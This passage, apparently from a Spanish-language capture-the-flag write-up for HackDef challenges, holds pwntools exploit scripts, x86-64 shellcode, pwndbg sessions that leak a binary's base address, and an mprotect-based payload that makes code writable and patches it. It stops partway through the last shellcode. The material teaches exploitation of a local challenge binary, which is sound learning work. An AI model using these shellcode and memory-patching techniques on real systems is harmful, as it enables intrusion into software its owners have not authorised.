+<code><span class="p">shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"""
+    xor rax, rax # $rax = read()
+    push 0x5     # /print_flag stdout
+    pop rdi      # $rdi = fd
+    mov rsi, rsp # $rdi = $rsp
+    push 0x40    # 64 bytes
+    pop rdx      # $rdx = 64
+    syscall      # syscall
+
+    push 0x1     # stoud
+    pop rdi      # $rdi = stdout
+    mov rax, rdi # $rax = write()
+    syscall      # syscall
+"""</span><span class="p">,</span><span class="ra"> arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, asm, p64, log
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./chal"</span><span class="p">)
+
+shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"""
+    xor rax, rax # $rax = read()
+    push 0x5     # /print_flag stdout
+    pop rdi      # $rdi = fd
+    mov rsi, rsp # $rdi = $rsp
+    push 0x40    # 64 bytes
+    pop rdx      # $rdx = 64
+    syscall      # syscall
+
+    push 0x1     # stoud
+    pop rdi      # $rdi = stdout
+    mov rax, rdi # $rax = write()
+    syscall      # syscall
+"""</span><span class="p">,</span><span class="ra"> arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"21222"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": </span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="na"> str</span><span class="p">(</span><span class="no">len</span><span class="p">(shellcode)).encode())
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":"</span><span class="p">, shellcode)
+shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
+
+rwx</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip())
+payload </span><span class="o">= </span><span class="p">p64(rwx)</span><span class="o"> *</span><span class="mi"> 512</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="s"> b"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, </span><span class="no">b</span><span class="s">"-2196"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="na"> str</span><span class="p">(</span><span class="no">len</span><span class="p">(payload)).encode())
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">, payload)
+
+shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">)
+flag</span><span class="o"> =</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">)
+log.info(</span><span class="no">f</span><span class="s">"Flag:</span><span class="p"> {flag.decode()}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './chal': pid 6425
+[</span><span class="az">*</span><span class="p">] Flag: hackdef{6_f4k3_fl4g_4_t35t1ng}
+[</span><span class="az">*</span><span class="p">] Stopped process './chal' (pid 6425)</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag7">
+<br><h3 class="post-title">Flag 7</h3><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">UUID</span><span class="na"> get_random_uuid</span><span class="p">() {
+    std::ifstream urandom(</span><span class="s">"/dev/urandom"</span><span class="p">, std::ios::in</span><span class="o"> |</span><span class="p"> std::ios::binary);
+    </span><span class="o">if</span><span class="p"> (</span><span class="o">!</span><span class="p">urandom) {
+        std::cerr</span><span class="o"> <<</span><span class="s"> "No se puede abrir /dev/urandom"</span><span class="o"> <<</span><span class="p"> std::endl;
+        </span><span class="no">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);
+    }
+
+    UUID value;
+    </span><span class="no">memset</span><span class="p">(value.bytes,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0x10</span><span class="p">);
+    urandom.read(</span><span class="o">reinterpret_cast</span><span class="p">&lt</span><span class="no">char</span><span class="o"> *</span><span class="p">>(value.bytes),</span><span class="mi"> 0x10</span><span class="p">);
+    urandom.close();
+
+    </span><span class="o">return</span><span class="p"> value;
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">#define</span><span class="na"> ITERACIONES</span><span class="mi"> 0x1300000
+
+</span><span class="p">SHA256_DIGEST</span><span class="na"> sha256</span><span class="p">(</span><span class="o">const</span><span class="no"> unsigned char</span><span class="o"> *</span><span class="ra">content</span><span class="p">,</span><span class="na"> size_t </span><span class="ra">len</span><span class="p">) {
+    SHA256_DIGEST ret;
+    SHA256(content, len, ret.bytes);
+    </span><span class="o">return</span><span class="p"> ret;
+}
+
+SHA256_DIGEST </span><span class="na">sha256_powN</span><span class="p">(</span><span class="o">const</span><span class="no"> unsigned char</span><span class="o"> *</span><span class="ra">content</span><span class="p">,</span><span class="na"> size_t</span><span class="ra"> len</span><span class="p">,</span><span class="na"> size_t</span><span class="ra"> N</span><span class="p">) {
+    </span><span class="no">auto</span><span class="p"> start</span><span class="o"> =</span><span class="p"> std::chrono::high_resolution_clock::now();
+
+    SHA256_DIGEST ret</span><span class="o"> =</span><span class="p"> sha256(content, len);
+    </span><span class="o">for (</span><span class="na">size_t</span><span class="p"> i</span><span class="o"> =</span><span class="mi"> 1</span><span class="p">; i</span><span class="o"> <</span><span class="p"> N; i</span><span class="o">++</span><span class="p">) {
+        ret</span><span class="o"> =</span><span class="p"> sha256(ret.bytes, SHA256_DIGEST_LENGTH);
+    }
+
+    </span><span class="no">auto</span><span class="p"> end</span><span class="o"> =</span><span class="p"> std::chrono::high_resolution_clock::now();
+    </span><span class="no">auto</span><span class="p"> duration</span><span class="o"> =</span><span class="p"> std::chrono::duration_cast&ltstd::chrono::milliseconds>(end </span><span class="o">-</span><span class="p"> start);
+
+    </span><span class="o">return</span><span class="p"> ret;
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">def</span><span class="na"> sha256</span><span class="p">(</span><span class="ra">nonce</span><span class="p">):
+    hash</span><span class="o"> =</span><span class="na"> bytes</span><span class="p">.fromhex(nonce.decode())
+    </span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">0x1300000</span><span class="p">):
+        hash </span><span class="o">= </span><span class="p">hashlib.sha256(hash).digest()
+    </span><span class="o">return</span><span class="p"> hash</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ /print_flag</span><span class="p">
+hackdef{6_f4k3_fl4g_4_t35t1ng}
+mylpwn
+34824CAD921B505E4644B9C83B3B7BF6</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">-q
+>>> import hashlib
+>>> def sha256(nonce):
+...     hash = bytes.fromhex(nonce.decode())
+...     for i in range(0x1300000):
+...         hash = hashlib.sha256(hash).digest()
+...     return hash
+...
+>>> nonce = b"34824CAD921B505E4644B9C83B3B7BF6"
+>>> sha256(nonce).hex().upper()
+'364F3FEB34950CD2CB5D81FADE1E7B0AB6407D80AAC58E8ADB420412DF3AD819'
+>>></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ /print_flag</span><span class="p">
+hackdef{6_f4k3_fl4g_4_t35t1ng}
+mylpwn
+34824CAD921B505E4644B9C83B3B7BF6
+364F3FEB34950CD2CB5D81FADE1E7B0AB6407D80AAC58E8ADB420412DF3AD819
+hackdef{mylpwn_f4k3_fl4g_4_t35t1ng}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">#include </span><span class="s">&ltunistd.h>
+
+</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
+    </span><span class="no">char</span><span class="p"> buffer[</span><span class="mi">65</span><span class="p">];
+
+    </span><span class="p">read(</span><span class="mi">5</span><span class="p">, buffer,</span><span class="mi"> 31</span><span class="p">);     </span><span class="c1">// read flag from /print_flag stdout
+    </span><span class="p">write(</span><span class="mi">1</span><span class="p">, buffer,</span><span class="mi"> 31</span><span class="p">);    </span><span class="c1">// write flag to chal stdout
+
+    </span><span class="p">write(</span><span class="mi">4,</span><span class="s"> "mylpwn</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="mi"> 7</span><span class="p">); </span><span class="c1">// write token to /print_flag stdin
+    </span><span class="p">read(</span><span class="mi">5</span><span class="p">, buffer,</span><span class="mi"> 33</span><span class="p">);</span><span class="c1">     // read nonce from /print_flag stdout
+    </span><span class="p">write(</span><span class="mi">1</span><span class="p">, buffer,</span><span class="mi"> 33</span><span class="p">);</span><span class="c1">    // write nonce to chal stdout
+
+    </span><span class="p">read(</span><span class="mi">0</span><span class="p">, buffer,</span><span class="mi"> 65</span><span class="p">);</span><span class="c1">     // read hash from chal stdin
+    </span><span class="p">write(</span><span class="mi">4</span><span class="p">, buffer,</span><span class="mi"> 65</span><span class="p">);</span><span class="c1">    // write hash to /print_flag stdin
+
+    </span><span class="p">read(</span><span class="mi">5</span><span class="p">, buffer,</span><span class="mi"> 65</span><span class="p">);</span><span class="c1">     // read flag from /pribt_flag stdout
+    </span><span class="p">write(</span><span class="mi">1</span><span class="p">, buffer,</span><span class="mi"> 65</span><span class="p">);</span><span class="c1">    // write flag to chal stdout
+</span><span class="p">}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"""
+    push 0x5                 # /print_flag stdout
+    pop rdi                  # $rdi = fd
+    mov rsi, rsp             # $rsi = flag
+    push 0x1f                # len(flag) = 31
+    pop rdx                  # $rdx = len(flag)
+    xor rax, rax             # $rax = read()
+    syscall                  # syscall
+
+    push 0x1                 # stdout
+    pop rdi                  # $rdi = stdout
+    mov rax, rdi             # $rax = write()
+    syscall                  # syscall
+
+    push 0x4                 # /print_flag stdin
+    pop rdi                  # $rdi = fd
+    mov rax, 0xa6e77706c796d # $rax = "mylpwn"
+    push rax                 # $rsp = &"mylpwn"
+    mov rsi, rsp             # $rsi = token
+    push 0x7                 # len(token) = 7
+    pop rdx                  # $rdx = len(token)
+    push 0x1                 # write()
+    pop rax                  # $rax = write()
+    syscall                  # syscall
+
+    push 0x5                 # /print_flag stdout
+    pop rdi                  # $rdi = fd
+    push 0x21                # len(nonce) = 33
+    pop rdx                  # $rdx = len(nonce)
+    xor rax, rax             # $rax = read()
+    syscall                  # syscall
+
+    push 0x1                 # stdout
+    pop rdi                  # $rdi = stdout
+    mov rax, rdi             # $rax = write()
+    syscall                  # syscall
+
+    xor rdi, rdi             # $rdi = stdin
+    push 0x41                # len(answer) = 65
+    pop rdx                  # $rdx = len(answer)
+    xor rax, rax             # $rax = read()
+    syscall                  # syscall
+
+    push 0x4                 # /print_flag stdin
+    pop rdi                  # $rdi = fd
+    push 0x1                 # write()
+    pop rax                  # $rax = write()
+    syscall                  # syscall
+
+    push 0x5                 # /print_flag stdout
+    pop rdi                  # $rdi = fd
+    xor rax, rax             # $rax = read()
+    syscall                  # syscall
+
+    push 0x1                 # stdout
+    pop rdi                  # $rdi = stdout
+    mov rax, rdi             # $rax = write()
+    syscall                  # syscall
+"""</span><span class="p">, </span><span class="ra">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">nonce</span><span class="o"> =</span><span class="p"> shell.recv(</span><span class="mi">32</span><span class="p">)
+log.info(</span><span class="no">f</span><span class="s">"Nonce:</span><span class="p"> {nonce.decode()}</span><span class="s">"</span><span class="p">)
+
+</span><span class="o">def</span><span class="na"> sha256</span><span class="p">(</span><span class="ra">nonce</span><span class="p">):
+    hash</span><span class="o"> =</span><span class="na"> bytes</span><span class="p">.fromhex(nonce.decode())
+    </span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">0x1300000</span><span class="p">):
+        hash </span><span class="o">= </span><span class="p">hashlib.sha256(hash).digest()
+    </span><span class="o">return</span><span class="p"> hash
+
+answer</span><span class="o"> =</span><span class="p"> sha256(nonce).hex().upper()
+log.info(</span><span class="no">f</span><span class="s">"Answer:</span><span class="p"> {answer}</span><span class="s">"</span><span class="p">)
+
+shell.sendline(answer.encode())</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, asm, p64, log, hashlib
+
+shell </span><span class="o">= </span><span class="p">process(</span><span class="s">"./chal"</span><span class="p">)
+
+shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"""
+    push 0x5                 # /print_flag stdout
+    pop rdi                  # $rdi = fd
+    mov rsi, rsp             # $rsi = flag
+    push 0x1f                # len(flag) = 31
+    pop rdx                  # $rdx = len(flag)
+    xor rax, rax             # $rax = read()
+    syscall                  # syscall
+
+    push 0x1                 # stdout
+    pop rdi                  # $rdi = stdout
+    mov rax, rdi             # $rax = write()
+    syscall                  # syscall
+
+    push 0x4                 # /print_flag stdin
+    pop rdi                  # $rdi = fd
+    mov rax, 0xa6e77706c796d # $rax = "mylpwn"
+    push rax                 # $rsp = &"mylpwn"
+    mov rsi, rsp             # $rsi = token
+    push 0x7                 # len(token) = 7
+    pop rdx                  # $rdx = len(token)
+    push 0x1                 # write()
+    pop rax                  # $rax = write()
+    syscall                  # syscall
+
+    push 0x5                 # /print_flag stdout
+    pop rdi                  # $rdi = fd
+    push 0x21                # len(nonce) = 33
+    pop rdx                  # $rdx = len(nonce)
+    xor rax, rax             # $rax = read()
+    syscall                  # syscall
+
+    push 0x1                 # stdout
+    pop rdi                  # $rdi = stdout
+    mov rax, rdi             # $rax = write()
+    syscall                  # syscall
+
+    xor rdi, rdi             # $rdi = stdin
+    push 0x41                # len(answer) = 65
+    pop rdx                  # $rdx = len(answer)
+    xor rax, rax             # $rax = read()
+    syscall                  # syscall
+
+    push 0x4                 # /print_flag stdin
+    pop rdi                  # $rdi = fd
+    push 0x1                 # write()
+    pop rax                  # $rax = write()
+    syscall                  # syscall
+
+    push 0x5                 # /print_flag stdout
+    pop rdi                  # $rdi = fd
+    xor rax, rax             # $rax = read()
+    syscall                  # syscall
+
+    push 0x1                 # stdout
+    pop rdi                  # $rdi = stdout
+    mov rax, rdi             # $rax = write()
+    syscall                  # syscall
+"""</span><span class="p">, </span><span class="ra">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"21222"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": </span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="na"> str</span><span class="p">(</span><span class="no">len</span><span class="p">(shellcode)).encode())
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":"</span><span class="p">, shellcode)
+shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
+
+rwx</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip())
+payload </span><span class="o">= </span><span class="p">p64(rwx)</span><span class="o"> *</span><span class="mi"> 512</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="s"> b"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, </span><span class="no">b</span><span class="s">"-2196"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="na"> str</span><span class="p">(</span><span class="no">len</span><span class="p">(payload)).encode())
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">, payload)
+
+shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">)
+shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">)
+
+nonce</span><span class="o"> =</span><span class="p"> shell.recv(</span><span class="mi">32</span><span class="p">)
+log.info(</span><span class="no">f</span><span class="s">"Nonce:</span><span class="p"> {nonce.decode()}</span><span class="s">"</span><span class="p">)
+
+</span><span class="o">def</span><span class="na"> sha256</span><span class="p">(</span><span class="ra">nonce</span><span class="p">):
+    hash</span><span class="o"> =</span><span class="na"> bytes</span><span class="p">.fromhex(nonce.decode())
+    </span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">0x1300000</span><span class="p">):
+        hash </span><span class="o">= </span><span class="p">hashlib.sha256(hash).digest()
+    </span><span class="o">return</span><span class="p"> hash
+
+answer</span><span class="o"> =</span><span class="p"> sha256(nonce).hex().upper()
+log.info(</span><span class="no">f</span><span class="s">"Answer:</span><span class="p"> {answer}</span><span class="s">"</span><span class="p">)
+
+shell.sendline(answer.encode())
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './chal': pid 21463
+[</span><span class="az">*</span><span class="p">] Nonce: 4D9727C49C90A9E521EEEC3847E2F4D1
+[</span><span class="az">*</span><span class="p">] Answer: CF8AF612A482422C4D0F6FEC792B16923C255C83C94CCE738514972267AEF35B
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+
+Te descubri hacker!
+[</span><span class="az">*</span><span class="p">] Process './chal' stopped with exit code 0 (pid 21633)
+[</span><span class="az">*</span><span class="p">] Got EOF while reading in interactive
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<a href="/challenges/creditcards/2.png" target="_blank"><div><p><img src="/challenges/creditcards/2.png"></p></div></a>
+
+<a href="/challenges/creditcards/3.png" target="_blank"><div><p><img src="/challenges/creditcards/3.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/i 0x49ea3
+</span><span class="az">   0x49ea3</span><span class="p"> &lt</span><span class="am">_Z15service_checkerv</span><span class="p">+158>:</span><span class="ve">  mov</span><span class="p">    DWORD PTR [</span><span class="ro">rbp</span><span class="p">-</span><span class="az">0x40</span><span class="p">],</span><span class="az">0x64</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> x/wx 0x49ea6
+</span><span class="az">0x49ea6</span><span class="p"> &lt</span><span class="am">_Z15service_checkerv</span><span class="p">+161>:     0x00000064
+</span><span class="ro">pwndbg></span><span class="p"> x/wd 0x49ea6
+</span><span class="az">0x49ea6</span><span class="p"> &lt</span><span class="am">_Z15service_checkerv</span><span class="p">+161>:     100
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">bool</span><span class="p"> op_leer</span><span class="o"> =</span><span class="mi"> true</span><span class="p">;
+
+</span><span class="o">case</span><span class="mi"> 3</span><span class="p">:
+    </span><span class="o">if</span><span class="p"> (op_leer) {
+        op_leer</span><span class="o"> =</span><span class="mi"> false</span><span class="p">;
+        consultar_NIP();
+    }</span><span class="o"> else </span><span class="p">{
+        </span><span class="no">puts</span><span class="p">(</span><span class="s">"No no no"</span><span class="p">);
+    }
+    </span><span class="o">break</span><span class="p">;</span>
+</code></pre></div></div><br>
+
+<a href="/challenges/creditcards/4.png" target="_blank"><div><p><img src="/challenges/creditcards/4.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/i 0x4ab64
+   </span><span class="az">0x4ab64</span><span class="p"> &lt</span><span class="am">_Z9main_menuv</span><span class="p">+172>: </span><span class="ve">cmp</span><span class="p">    BYTE PTR [</span><span class="ro">rbp</span><span class="p">-</span><span class="az">0x5</span><span class="p">],</span><span class="az">0x0</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> x/bx 0x4ab67
+</span><span class="az">0x4ab67</span><span class="p"> &lt</span><span class="am">_Z9main_menuv</span><span class="p">+175>:    0x00
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<a href="/challenges/creditcards/5.png" target="_blank"><div><p><img src="/challenges/creditcards/5.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/i 0x49e77
+   </span><span class="az">0x49e77</span><span class="p"> &lt</span><span class="am">_Z15service_checkerv</span><span class="p">+114>:</span><span class="ve">  mov</span><span class="ro">    edi</span><span class="p">,</span><span class="az">0x487</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> x/wx 0x49e78
+</span><span class="az">0x49e78</span><span class="p"> &lt</span><span class="am">_Z15service_checkerv</span><span class="p">+115>:     0x00000487
+</span><span class="ro">pwndbg></span><span class="p"> x/wd 0x49e78
+</span><span class="az">0x49e78</span><span class="p"> &lt</span><span class="am">_Z15service_checkerv</span><span class="p">+115>:     1159
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> vmmap chal
+LEGEND:</span><span class="am"> STACK</span><span class="p"> | </span><span class="az">HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA </span><span class="p">|</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
+►   0x555555554000     0x55555558a000 r--p    36000       0 chal
+►   0x55555558a000     0x5555555aa000 r-xp    20000   36000 chal
+►   0x5555555aa000     0x5555555b4000 r--p     a000   56000 chal
+►   0x5555555b4000     0x5555555ba000 r--p     6000   5f000 chal
+►   0x5555555ba000     0x5555555bb000 rw-p     1000   65000 chal
+    0x5555555bb000     0x5555555c0000 rw-p     5000       0 [heap]
+pwndbg> p/x 0x55555558a000 - 0x555555554000
+$1 = 0x36000
+pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">#!/usr/bin/python3
+from pwn import gdb
+
+shell = gdb.debug("./chal", "continue")
+
+shell.sendlineafter(b"> ", b"3")
+shell.sendlineafter(b": ", b"admin")
+shell.sendlineafter(b": ", b"MM\x11N")
+
+shell.sendlineafter(b"> ", b"-1000")
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 exploit.py
+[+] Starting local process '/usr/bin/gdbserver': pid 22271
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './chal']
+[*] Switching to interactive mode
+SECRETO: 97558834600304
+Servicio interno de tarjetas de credito
+** Menu:
+1. Registrar tarjeta
+2. Registrar NIP
+3. Consultar NIP
+4. Borrar NIP
+5. Salir
+> OK
+$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">pwndbg> x/i 97558834600304
+   0x58baafae5970 &lt_Z8tarjetasB5cxx11+208>:     add    BYTE PTR [rax],al
+pwndbg> vmmap chal
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
+►   0x58baafa7d000     0x58baafab3000 r--p    36000       0 /home/user/HackDefMty/chal/chal
+►   0x58baafab3000     0x58baafad3000 r-xp    20000   36000 /home/user/HackDefMty/chal/chal
+►   0x58baafad3000     0x58baafadd000 r--p     a000   56000 /home/user/HackDefMty/chal/chal
+►   0x58baafadd000     0x58baafae3000 r--p     6000   5f000 /home/user/HackDefMty/chal/chal
+►   0x58baafae3000     0x58baafae4000 rw-p     1000   65000 /home/user/HackDefMty/chal/chal
+    0x58baafae4000     0x58baafae9000 rw-p     5000       0 [anon_58baafae4]
+pwndbg> p/x 97558834600304 - 0x58baafa7d000
+$1 = 0x68970
+pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">#!/usr/bin/python3
+from pwn import gdb, log
+
+shell = gdb.debug("./chal", "continue")
+
+shell.sendlineafter(b"> ", b"3")
+shell.sendlineafter(b": ", b"admin")
+shell.sendlineafter(b": ", b"MM\x11N")
+
+shell.sendlineafter(b"> ", b"-1000")
+shell.recvuntil(b": ")
+
+binary_base = int(shell.recvline().strip()) - 0x68970
+log.info(f"Binary base: {hex(binary_base)}")
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 exploit.py
+[+] Starting local process '/usr/bin/gdbserver': pid 29262
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './chal']
+[*] Binary base: 0x628e0c123000
+[*] Switching to interactive mode
+Servicio interno de tarjetas de credito
+** Menu:
+1. Registrar tarjeta
+2. Registrar NIP
+3. Consultar NIP
+4. Borrar NIP
+5. Salir
+> $</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">pwndbg> vmmap 0x628e0c123000
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
+►   0x628e0c123000     0x628e0c159000 r--p    36000       0 /home/user/HackDefMty/chal/chal +0x0
+    0x628e0c159000     0x628e0c179000 r-xp    20000   36000 /home/user/HackDefMty/chal/chal
+pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">#!/usr/bin/python3
+from pwn import gdb, asm, p64, log
+
+shell = gdb.debug("./chal", "continue")
+
+shell.sendlineafter(b"> ", b"3")
+shell.sendlineafter(b": ", b"admin")
+shell.sendlineafter(b": ", b"MM\x11N")
+
+shell.sendlineafter(b"> ", b"-1000")
+shell.recvuntil(b": ")
+
+binary_base = int(shell.recvline().strip()) - 0x68970
+
+shellcode = asm(f"""
+    mov rdi, {hex(binary_base + 0x36000)} # $rdi = .text
+    mov rsi, 0x20000                      # $rsi = size
+    mov rdx, 0x7                          # $rdx = rwx
+    push 0xa                              # mprotect()
+    pop rax                               # $rax = mprotect()
+    syscall                               # syscall
+""", arch="amd64")
+
+shell.sendlineafter(b"> ", b"21222")
+shell.sendlineafter(b": \n", str(len(shellcode)).encode())
+shell.sendlineafter(b":", shellcode)
+shell.recvuntil(b": ")
+
+rwx = int(shell.recvline().strip())
+payload = p64(rwx) * 512
+
+shell.sendlineafter(b"> ", b"2")
+shell.sendlineafter(b"> ", b"-2196")
+shell.sendlineafter(b": ", str(len(payload)).encode())
+shell.sendlineafter(b": ", payload)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">pwndbg> vmmap chal
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
+►   0x5ec353647000     0x5ec35367d000 r--p    36000       0 /home/user/HackDefMty/chal/chal
+►   0x5ec35367d000     0x5ec35369d000 rwxp    20000   36000 /home/user/HackDefMty/chal/chal
+►   0x5ec35369d000     0x5ec3536a7000 r--p     a000   56000 /home/user/HackDefMty/chal/chal
+►   0x5ec3536a7000     0x5ec3536ad000 r--p     6000   5f000 /home/user/HackDefMty/chal/chal
+►   0x5ec3536ad000     0x5ec3536ae000 rw-p     1000   65000 /home/user/HackDefMty/chal/chal
+    0x5ec3536ae000     0x5ec3536b3000 rw-p     5000       0 [anon_5ec3536ae]
+pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">shellcode = asm(f"""
+    mov rdi, {hex(binary_base + 0x36000)} # $rdi = .text
+    mov rsi, 0x20000                      # $rsi = size
+    mov rdx, 0x7                          # $rdx = rwx
+    push 0xa                              # mprotect()
+    pop rax                               # $rax = mprotect()
+    syscall                               # syscall
+
+    mov rdi, {hex(binary_base + 0x40171)} # $rdi = &salir()
+    mov byte ptr [rdi], 0xc3              # salir() = ret
+    mov rdi, {hex(binary_base + 0x49ea6)} # $rdi = &timeout
+    mov dword ptr [rdi], 0x493e0          # timeout = 5 mins
+
+    mov rdi, {hex(binary_base + 0x4ab67)} # $rdi = &check
+    mov byte ptr [rdi], 0x1               # check = true
